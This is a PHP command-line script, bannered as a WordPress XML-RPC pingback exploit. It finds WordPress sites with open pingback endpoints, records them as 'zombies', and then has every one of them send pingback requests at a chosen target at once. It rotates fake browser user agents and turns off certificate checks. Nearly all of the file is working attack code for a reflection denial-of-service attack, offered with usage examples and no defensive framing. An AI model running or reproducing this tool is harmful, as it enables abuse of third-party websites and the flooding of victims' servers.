<?php

$user_agents = array(

    // Windows
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)",
    "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",

    // MAC
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",

    // Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
    "Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0",
    "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
    "Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0"

    );

function HTTPRequest($url = '', $follow = true, $head = false) {

	global $user_agents;

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agents[array_rand($user_agents)]);
	// curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt');
	// curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__).'/cookie.txt');

    if ($follow) curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	if ($head) curl_setopt($ch, CURLOPT_HEADER, 1);

	$data = curl_exec($ch);

	return $data ? $data : false;

}

function HTTPMultiRequest($urls = array(), $follow = true, $head = false, $post = false) {
    
    global $user_agents;

    $multiCurl = curl_multi_init();

    foreach ($urls as $i => $url) {

        $ch[$i] = curl_init();

        curl_setopt($ch[$i], CURLOPT_NOBODY, 1);
        curl_setopt($ch[$i], CURLOPT_HEADER, 1);
        curl_setopt($ch[$i], CURLOPT_TIMEOUT, 15);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch[$i], CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch[$i], CURLOPT_URL, $url);
        curl_setopt($ch[$i], CURLOPT_USERAGENT, $user_agents[ array_rand($user_agents) ]);
        // curl_setopt($ch[$i], CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
        // curl_setopt($ch[$i], CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');

        if ($follow) curl_setopt($ch[$i], CURLOPT_FOLLOWLOCATION, 1);
        if ($head) curl_setopt($ch[$i], CURLOPT_HEADER, 1);

        if ($post) {

			curl_setopt($ch[$i], CURLOPT_POST, 1);
			curl_setopt($ch[$i], CURLOPT_POSTFIELDS, $post[$i]);

		}

        curl_multi_add_handle($multiCurl, $ch[$i]);

    }

    do {

    	curl_multi_exec($multiCurl, $active);

    } while($active > 0);

    foreach($ch as $id => $connection) {

        $data = curl_multi_getcontent($connection);

        curl_multi_remove_handle($multiCurl, $connection);
        curl_close($connection);

        $arrData[$id] = $data;

    }

    curl_multi_close($multiCurl);

    return !empty($arrData) ? $arrData : false;
    
}

function xml($target, $post) {

    $xml = '<?xml version="1.0" encoding="iso-8859-1"?>';
    $xml .= '<methodCall>';
    $xml .= '<methodName>pingback.ping</methodName>';
    $xml .= '<params>';
    $xml .= '<param><value><string>' . $target . '</string></value></param>';
    $xml .= '<param><value><string>' . $post . '</string></value></param>';
    $xml .= '</params>';
    $xml .= '</methodCall>';

    return $xml;

}

function progress($done, $total) {

    printf("\r    [+] Progress: %d/%d - %d%%", $done, $total, number_format($done/$total*100, 0));

}

echo '

    __________  __________________ ____  __.
    \______   \/  _____/\______   \    |/ _|
     |     ___/   \  ___ |    |  _/      <  
     |    |   \    \_\  \|    |   \    |  \ 
     |____|    \______  /|______  /____|__ \
                      \/        \/        \/

       wordpress xmlrpc pingback exploit
';

$args = getopt('', array('zombie:', 'ping:', 'threads:'));

if (isset($args['zombie'])) {

    $zombies = stripos($args['zombie'], '@') !== false ? file(str_replace('@', '', $args['zombie']), FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : (array)$args['zombie'];

    foreach ($zombies as $zombie) {
       
        $url = (substr($zombie, 0, 4) == 'http' ? '' : 'http://') . rtrim($zombie, '/');
        $source = HTTPRequest($url);

        if (stripos($source, '404 not found') !== false)  {

            echo '    [-] Cannot connect to' . $url . "\n";
            continue;

        }

        if (!preg_match('#x-pingback: (.*?)\r\n#i', $source, $xmlrpc)) 
            if (!preg_match('#<link rel="pingback" href="([^"]+)" ?/?>#i', $source, $xmlrpc))
                $xmlrpc[1] = $url . '/xmlrpc.php';
        
        $rss_path = preg_match('#<link .* type="application/rss\+xml" .* href="([^"]+)" />#i', $source, $rss) ? $rss[1] :  $url . '/feed=rss2';
        $api = stripos(HTTPRequest($xmlrpc[1]), 'XML-RPC server accepts POST requests only') !== false ? $xmlrpc[1] : false;
        $posts = preg_match_all('#<link>([^<]+)</link>#i', HTTPRequest($rss_path), $links) ? array_slice($links[1], 1) : false;

        if (!$api) {

            echo '    [-] XML-RPC api cannot be detected at ' . $url . "\n";
            continue;

        }

        if (!$posts) {

            echo '    [-] No valid blog posts found at ' . $url . "\n";
            continue;

        }

        foreach ($posts as $post) {
            
            $xml = xml('http://www.google.com', $post);
            $response = HTTPRequest($api, null, null, $xml);

            if (stripos($response, '200 ok') !== false && stripos($response, '<value><int>33</int></value>') === false) {
                
                echo '    [+] adding ' . $url . ' to zombie list...' . "\n";

                $arr = json_decode(@file_get_contents('zombie.json'), 1);
                $arr[$api] = $post;

                file_put_contents('zombie.json', json_encode(array_unique($arr)));

                break;

            }

        }

    }


} elseif (isset($args['ping'])) {
    
    $url = (substr($args['ping'], 0, 4) == 'http' ? '' : 'http://') . rtrim($args['ping'], '/');
    $threads = isset($args['threads']) ? $ars['threads'] : 10;
    $zombies = json_decode(file_get_contents('zombie.json'), 1);
    $total = count($zombies);
    $done = 0;

    echo '    [+] ' . $total . ' zombies loaded!' . "\n";
    echo '    [+] sending request to ' . $url . "\n";
    progress($done, $total);

    foreach(array_chunk($zombies, $threads, true) as $chunk) {

        foreach ($chunk as $api => $post) {

           $apis[] = $api;
           $xmls[] = xml($url, $post);
           $done++;

        }

        HTTPMultiRequest($apis, null, null, $xmls);
        progress($done, $total);

    }

    echo "\n";

} else {

    echo '

    usage : 

        --zombie [url|@list] = add to zombie list (wp site only)
        --ping   [target]    = send pingback request to target
                               from zombie sites

    example :

        php ' . $argv[0] . ' --zombie www.zombie.com/wp/
        php ' . $argv[0] . ' --zombie @list.txt
        php ' . $argv[0] . ' --ping www.target.com

    ';

}


?>